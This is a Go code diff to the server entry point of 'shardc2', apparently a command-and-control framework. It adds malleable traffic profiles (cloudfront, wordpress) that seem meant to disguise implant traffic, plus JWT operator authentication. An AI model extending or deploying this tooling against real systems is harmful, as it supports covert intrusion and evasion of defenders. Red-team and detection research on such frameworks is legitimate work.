@@ -12,6 +12,7 @@ import (
 	"github.com/shardc2/shardc2/internal/server"
 	"github.com/shardc2/shardc2/internal/server/middleware"
 	"github.com/shardc2/shardc2/pkg/crypto"
+	"github.com/shardc2/shardc2/pkg/profiles"
 )
 
 const banner = `
@@ -36,6 +37,8 @@ func main() {
 		tlsCert       = flag.String("tls-cert", "", "TLS certificate file")
 		tlsKey        = flag.String("tls-key", "", "TLS private key file")
 		generateCert  = flag.Bool("generate-cert", false, "Generate self-signed TLS certificate and exit")
+		profileName   = flag.String("profile", "default", "Malleable C2 profile (default, cloudfront, wordpress, or path to JSON)")
+		jwtSecret     = flag.String("jwt-secret", os.Getenv("SHARDC2_JWT_SECRET"), "JWT signing secret for operator auth")
 	)
 	flag.Parse()
 
@@ -98,11 +101,26 @@ func main() {
 		fmt.Println("[+] Payload encryption enabled")
 	}
 
+	profile, err := profiles.Load(*profileName)
+	if err != nil {
+		log.Fatalf("[-] Failed to load profile: %v", err)
+	}
+	if *profileName != "default" {
+		fmt.Printf("[+] Malleable profile: %s\n", profile.Name)
+	}
+
+	jwtSecretBytes := []byte(*jwtSecret)
+	if len(jwtSecretBytes) == 0 {
+		jwtSecretBytes = []byte(*operatorToken)
+	}
+
 	cfg := server.ServerConfig{
 		OperatorToken: *operatorToken,
 		ImplantKey:    *implantKey,
 		PayloadKey:    payloadKeyBytes,
 		C2URL:         *c2URL,
+		Profile:       profile,
+		JWTSecret:     jwtSecretBytes,
 	}
 	srv := server.New(db, cfg)
 
